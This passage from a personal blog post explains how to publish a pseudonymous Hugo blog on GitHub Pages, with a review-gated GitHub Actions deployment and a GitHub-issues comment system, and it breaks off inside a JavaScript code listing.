As there is no server-side code, it is closed to impossible to takeover the backend and
a more probable attack vector is to compromise instead the github credentials, tokens or ssh keys &hellip;
which are not accessible from the website itself, but from my laptop which therefore becomes the most likely attack vector.
While, most of the security of the blog is managed by github directly, there is a set of good practices that I generally recommend,
to avoid being the weakest link:</p>
<ul>
<li>use a password manager to vault your email and github credentials, with strong password encryption</li>
<li>secure your ssh keys with a passphrase</li>
<li>use a different ssh keys per repositories</li>
<li>github token should have the minimum permissions as possible</li>
<li>never reuse an existing github token for a different purpose, create a new token instead</li>
</ul>
<h3 id="a-deployment-strategy-to-mitigate-your-real-identity-leak">A deployment strategy to mitigate your real identity leak</h3>
<p>Manual is always error-prone and may result in leaking my identity by mistake.
I have therefore decided to automate the build and deployment of the hugo static website into GitHub Pages via GitHub Actions.
Creating a Hugo website and setting up a GitHub pages is out of scope for this article.</p>
<p>There is mostly two strategies to deal with deployment:</p>
<ul>
<li><strong>use a single repository</strong> with two branches: main branch for source code and gh-pages for published website</li>
<li><strong>use separate repositories</strong>: the source code is in a private repository and receive manual commits, github-actions auto-commit static pages into the gh-pages repo</li>
</ul>
<table>
<thead>
<tr>
<th>single repository</th>
<th>Separate repositories</th>
</tr>
</thead>
<tbody>
<tr>
<td>🟢 single repository = &gt; less maintenance</td>
<td>🔴 Additional work to set up and configure two repos (one-time-effort)</td>
</tr>
<tr>
<td>🔴 different contents between your source branch and the gh-pages branch</td>
<td>💚 Align with clean git branching strategies.</td>
</tr>
<tr>
<td>🔴 commit leaks and comments are publicly available, beware of <code>git config</code></td>
<td>💚 manual commit on a private repo, github-actions to push without leak to your gh-pages repo</td>
</tr>
</tbody>
</table>
<p>The separate repositories approach works better on a pure SecOps perspective,
but it is not sufficient as it could be possible to inadvertently leak information on the articles content itself.
Therefore I have to consider the review process prior github-actions automatically build and deploy content to gh-pages.</p>
<p>When considering the review process, we must consider as well that we can build and re-deploy :</p>
<ul>
<li>at every single commit</li>
<li>when reviewing an issue in github</li>
</ul>
<table>
<thead>
<tr>
<th>every single commit</th>
<th>after a PR is approved</th>
</tr>
</thead>
<tbody>
<tr>
<td>🔴 There is no possible review process</td>
<td>💚 you can enforce review and squash commits prior merge</td>
</tr>
<tr>
<td>🔴 once commited, content is publicly exposed</td>
<td>💚 once committed you have to approve before merge</td>
</tr>
<tr>
<td>🔴 all commits metadata are publicly available</td>
<td>💚 source repo commits are private, gh-pages commits have no sensitive information</td>
</tr>
<tr>
<td>🔴 energy consuming</td>
<td>💚 Energy friendly as we build only when we have meaningful changes</td>
</tr>
</tbody>
</table>
<p>We will build and deploy after a PR (a github issue) is approved</p>
<h3 id="a-comment-engine-which-is-respectful-of-your-privacy">A comment engine which is respectful of your privacy</h3>
<p>When it comes with blogging, we want to interact with people and receive feedback. This interaction is priceless to confront ideas and build better ones.
While there is plethor of engines to offer incredibly friendly comment features on a static blog, I found the privacy price-tag incredibly high,
and most of those solutions were quite expensive.</p>
<blockquote>
<p>Again whether cheap or expensive, money trail implies easy back-tracking to people real identity</p>
</blockquote>
<p>Without a backend, I need to use javascript tokens and a third-party engine such as infamous <code>disqus</code>, and I can&rsquo;t keep to question
the security of such tokens: it could be used by someone malicious to flood me with thousands of fake comments.
Another option could be <code>facebook comments</code> which requires user to be tracked by facebook instead of disqus.</p>
<p>Such third-parties tracking my audience and my website traffic totally goes against my principles, whichever the reason (targeted ads&hellip;).
I found instead that anybody can create an anonymous or pseudonymized github account like the gh-pages account running this website,
and this will allow them to comment or contribute to my privacy project without a need to disclose their real identity nor register an external services.</p>
<p>This website is using <code>github issues</code> as a backend and offers all commenting features available in github 😍 !!!
It is totally free and does not require a third party or a token:</p>
<ul>
<li>Each visitor can read all comments anonymously (no login required)</li>
<li>Each visitor is offered the possibility to leave a comment with their github account</li>
</ul>
<p><strong>quick comparison analysis</strong>:</p>
<p>The main reason for using github for comments is because github issues have not be designed with profiling or tracking in mind
as opposed to social media. It is using API and is free from those fancy but common features aiming to track people:</p>
<table>
<thead>
<tr>
<th>github-comments</th>
<th>disqus</th>
<th>facebook.comments</th>
</tr>
</thead>
<tbody>
<tr>
<td>free</td>
<td>not free</td>
<td>free</td>
</tr>
<tr>
<td>lightweight</td>
<td>heavy</td>
<td>average</td>
</tr>
<tr>
<td>fast loadtime</td>
<td>slow</td>
<td>slow</td>
</tr>
<tr>
<td>no cookies</td>
<td>cookies</td>
<td>(super) cookies</td>
</tr>
<tr>
<td>no tracking</td>
<td>track your movements</td>
<td>track you and your history</td>
</tr>
<tr>
<td>no profiling</td>
<td>fingerprinting, tracking</td>
<td>fingerprinting, tracking</td>
</tr>
<tr>
<td>no 3rd parties</td>
<td>multiple 3rd parties</td>
<td>don&rsquo;t need a third party</td>
</tr>
<tr>
<td>no advertising ID</td>
<td>advertisements</td>
<td>it is their business model</td>
</tr>
<tr>
<td>no need API key or token</td>
<td>token or key</td>
<td>token or key</td>
</tr>
</tbody>
</table>
<h2 id="the-technical-section">The technical section</h2>
<h3 id="zoom-on-github-actions">Zoom on github-actions</h3>
<p>Upon PR creation or new commit</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#ff79c6">on</span>:
  <span style="color:#ff79c6">pull_request</span>:
    <span style="color:#ff79c6">branches</span>: [main]
    <span style="color:#ff79c6">types</span>: [opened, synchronize, closed]
</code></pre></td></tr></table>
</div>
</div><p>the active branch is checkout and is used to build the hugo website.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#ff79c6">jobs</span>:
  <span style="color:#ff79c6">build-deploy</span>:
    <span style="color:#ff79c6">runs-on</span>: ubuntu-latest
    <span style="color:#ff79c6">steps</span>:
      - <span style="color:#ff79c6">uses</span>: actions/checkout@v2
        <span style="color:#ff79c6">with</span>:
          <span style="color:#ff79c6">submodules</span>: <span style="color:#ff79c6">true</span>
</code></pre></td></tr></table>
</div>
</div><p>and the website is built with latest hugo engine:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#ff79c6">steps</span>:
  [..]
  - <span style="color:#ff79c6">name</span>: Setup Hugo
    <span style="color:#ff79c6">uses</span>: peaceiris/actions-hugo@v2
    <span style="color:#ff79c6">with</span>:
      <span style="color:#ff79c6">hugo-version</span>: <span style="color:#f1fa8c">&#34;latest&#34;</span>

      - <span style="color:#ff79c6">name</span>: Build
        <span style="color:#ff79c6">run</span>: hugo --minify -F
        [..]
</code></pre></td></tr></table>
</div>
</div><p>However, as an extra protection, the new website won&rsquo;t be deployed unless it has been reviewed and fully approved</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#ff79c6">steps</span>:
  [..]
  - <span style="color:#ff79c6">name</span>: Deploy
    <span style="color:#ff79c6">if</span>: github.event.review.state == &#39;approved&#39;
    <span style="color:#ff79c6">uses</span>: peaceiris/actions-gh-pages@v3
    <span style="color:#ff79c6">with</span>:
      <span style="color:#ff79c6">deploy_key</span>: ${{ secrets.ACTIONS_DEPLOY_KEY }}
      <span style="color:#ff79c6">external_repository</span>: <span style="color:#bd93f9">0xade1</span>/0xade1.github.io
      <span style="color:#ff79c6">publish_dir</span>: ./public
      <span style="color:#ff79c6">publish_branch</span>: gh-pages

  - <span style="color:#ff79c6">name</span>: Skip Deploy
    <span style="color:#ff79c6">if</span>: github.event.review.state != &#39;approved&#39;
    <span style="color:#ff79c6">run</span>: |<span style="color:#f1fa8c">
</span><span style="color:#f1fa8c">      </span>      echo &#34;The PR does not have the deploy label =&gt; skipping deployment&#34;
</code></pre></td></tr></table>
</div>
</div><p>Alternatively, if you don&rsquo;t have a team of reviewers to approve your PR, you can instead
prevent the deployment if your PR does not have the <code>deploy</code> label:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#ff79c6">if</span>: contains( github.event.pull_request.labels.*.name, &#39;deploy&#39;)
</code></pre></td></tr></table>
</div>
</div><p>What if I forgot to add the <code>deploy</code> label after committing my website? You can always:</p>
<ol>
<li>add the deploy label to your PR</li>
<li>send an empty commit</li>
<li>push changes in your remote branch</li>
</ol>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">git commit --allow-empty -m <span style="color:#f1fa8c">&#34;Trigger Build&#34;</span>
git push -u origin &lt;branch-name&gt;

</code></pre></td></tr></table>
</div>
</div><p>and the most important before publishing any real content with this action:</p>
<ul>
<li><strong>TEST YOUR GITHUB ACTION with DUMMY content</strong></li>
<li><strong>VERIFY your github commits meta data are free from leaks</strong></li>
</ul>
<p>I had to go on a long process of tries, fails and learn: purging, squashing my git log history
to remove my real identity when I discovered my push delivery method was mixing-up several
github accounts I am using for different purpose.
This is lesson is learnt with hours of troubleshooting and searching and I will certainly make another blog post to explain.
I advise against a shortcut where you test with real content without verification of your SecOps Delivery process.</p>
<h3 id="zoom-on-commenting-system-with-github-isues-api">Zoom on commenting system with github isues API</h3>
<p>I first edit my theme <code>layouts/partials/comments.html</code> file so that the comments section
is only visible if the article has a <strong>ghcommentid</strong>. The ghcommentid is simply a github issue id,
that I have especially created to deliver and receive comments.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">{{ if $.Params.ghcommentid }}
&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;gh-comments&#34;</span>&gt;
  &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;gh-comments-list&#34;</span>&gt;&lt;/<span style="color:#ff79c6">div</span>&gt;
  &lt;<span style="color:#ff79c6">a</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;javascript:void(0)&#34;</span>&gt;
    &lt;<span style="color:#ff79c6">span</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;gh-load-comments&#34;</span> <span style="color:#50fa7b">style</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width: auto&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;button&#34;</span>
      &gt;Load more comments&lt;/<span style="color:#ff79c6">span</span>
    &gt;
  &lt;/<span style="color:#ff79c6">a</span>&gt;
&lt;/<span style="color:#ff79c6">div</span>&gt;

&lt;<span style="color:#ff79c6">script</span>
  <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://code.jquery.com/jquery-3.5.1.min.js&#34;</span>
  <span style="color:#50fa7b">integrity</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=&#34;</span>
  <span style="color:#50fa7b">crossorigin</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;anonymous&#34;</span>
&gt;&lt;/<span style="color:#ff79c6">script</span>&gt;
&lt;<span style="color:#ff79c6">script</span>
  <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;text/javascript&#34;</span>
  <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;{{ .Site.BaseURL }}/js/github-comments.js&#34;</span>
&gt;&lt;/<span style="color:#ff79c6">script</span>&gt;
&lt;<span style="color:#ff79c6">script</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;text/javascript&#34;</span>&gt;
  DoGithubComments({{ $.Params.ghcommentid }});
&lt;/<span style="color:#ff79c6">script</span>&gt;
{{ end }}
</code></pre></td></tr></table>
</div>
</div><p>You&rsquo;ll need some javascript for the magic to operate, don&rsquo;t forget to change the repo_name variable with your github repo:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
